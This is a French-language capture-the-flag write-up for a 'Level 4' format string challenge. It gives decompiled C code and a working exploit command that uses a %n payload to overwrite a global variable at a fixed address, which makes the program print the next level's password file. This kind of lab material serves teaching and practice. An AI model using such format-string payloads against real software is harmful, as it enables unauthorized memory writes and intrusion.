# Level 4 - Format String Vulnerability

## Analyse du binaire
En décompilant le binaire, on trouve le code suivant :

```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) // 16930116 en décimal
  {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

Le programme :
1. Lit l'entrée utilisateur avec fgets
2. Passe cette entrée à la fonction p()
3. Compare la variable globale 'm' avec 0x1025544
4. Si égal, affiche le flag

## Vulnérabilité
- Le programme est vulnérable à une attaque format string via la fonction p()
- Nous pouvons utiliser cette vulnérabilité pour écrire à l'adresse de 'm'
- L'adresse de 'm' est : 0x8049810

## Exploitation
Pour obtenir le flag, nous devons :
1. Écrire l'adresse de 'm' au début de notre payload
2. Utiliser %n pour écrire la valeur 16930116 à cette adresse

La commande :
```bash
(python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")'; cat -) | ./level4
```

Décomposition :
- `\x10\x98\x04\x08` : Adresse de 'm' en little-endian
- `%16930112d` : Format qui va générer 16930112 espaces
- `%12$n` : Écrit le nombre de caractères affichés à la 12ème position de la stack
- `cat -` : Garde stdin ouvert

## Résultat
L'exploit modifie avec succès la valeur de 'm' à 0x1025544, ce qui déclenche l'affichage du flag.

Note : On utilise %16930112d au lieu de répéter 'A' 16930112 fois car le terminal ne peut pas gérer autant de caractères directement.

